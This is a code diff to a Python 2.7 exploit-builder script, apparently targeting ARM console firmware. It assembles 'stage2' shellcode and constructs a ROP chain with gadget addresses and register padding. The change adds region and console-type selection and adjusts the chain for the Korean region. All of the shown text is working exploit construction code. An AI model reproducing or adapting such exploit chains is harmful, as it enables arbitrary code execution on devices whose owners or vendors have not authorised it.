@@ -1,5 +1,6 @@
 #!/usr/bin/python2.7
 
+import sys
 from struct import pack
 from subprocess import call
 from constants import STAGE2_SIZE, constants
@@ -7,6 +8,12 @@ from os import environ, path, name as osname
 
 REGION = "usa"
 TYPE = "old" # "new"
+
+if len(sys.argv) > 1:
+    REGION = sys.argv[1].lower()
+
+if len(sys.argv) > 2:
+    TYPE = sys.argv[2].lower()
 
 for name, regions in constants.items():
     if REGION not in regions:
@@ -29,7 +36,7 @@ def get_arm_none_eabi_binutils_exec(name):
 def get_shellcode():
     # assemble stage 2
     call([get_arm_none_eabi_binutils_exec("gcc"), "-x", "assembler-with-cpp", "-nostartfiles",
-        "-nostdlib", "-o", "stage2.bin", "stage2.s"])
+        "-nostdlib", "-D", REGION.upper(), "-D", TYPE.upper(), "-o", "stage2.bin", "stage2.s"])
     # generate raw instruction bytes
     call([get_arm_none_eabi_binutils_exec("objcopy"), "-O", "binary", "stage2.bin"])
     # read in the shellcode
@@ -130,8 +137,9 @@ rop += "AAAA" # r6
 rop += "AAAA" # r7
 rop += "AAAA" # r8
 rop += "AAAA" # r9
-rop += "AAAA" # r10
-rop += "AAAA" # r11
+if REGION != 'kor':
+    rop += "AAAA" # r10
+    rop += "AAAA" # r11
 rop += p(pop_r0_pc) # pc
 rop += p(0x10000000) # r0
 rop += p(pop_r1_pc) # pc
